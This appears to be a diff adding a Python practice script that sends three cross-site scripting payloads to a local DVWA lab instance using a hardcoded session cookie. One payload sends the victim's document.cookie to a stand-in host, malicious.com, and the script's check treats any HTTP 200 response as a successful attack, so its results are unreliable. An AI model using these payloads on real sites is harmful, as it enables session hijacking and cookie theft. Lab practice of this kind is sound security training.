@@ -1,0 +1,45 @@
+import requests
+
+# Adjust the URL to point to the correct DVWA path
+url = 'http://127.0.0.1/index.php'
+
+# Replace with your actual session cookies from DVWA
+cookies = {
+    'PHPSESSID': "b6sfs6mdktjd2ac9maq44etjq7",  
+    'security': 'low'  # Ensure the security level matches the one set in DVWA
+}
+
+# List of payloads to test different types of XSS
+xss_payloads = {
+    "Basic XSS": "<script>alert('XSS')</script>",
+    "DOM-based XSS": "<img src='x' onerror='alert(1)'>",
+    "Stored XSS": "<script>window.location='http://malicious.com/cookie.php?cookie='+document.cookie</script>"
+}
+
+# Function to test XSS
+def test_xss():
+    print("Testing XSS vulnerabilities...\n")
+    for name, payload in xss_payloads.items():
+        data = {
+            'name': payload,  # Adjust 'name' to the parameter vulnerable to XSS
+            'Submit': 'Submit'
+        }
+
+        try:
+            response = requests.post(url, cookies=cookies, data=data, timeout=10)
+
+            # Check response content or status code for more detailed analysis
+            if '<script>alert(' in response.text or response.status_code == 200:
+                print(f"XSS successful with {name}: {payload}")
+                print(f"Vulnerability Type: Cross-Site Scripting (XSS)")
+            else:
+                print(f"XSS unsuccessful with {name}: {payload}")
+                print(f"Vulnerability Type: Cross-Site Scripting (XSS)")
+
+            print("-" * 50)
+
+        except requests.exceptions.RequestException as e:
+            print(f"Error: {e}")
+
+# Run XSS test
+test_xss()
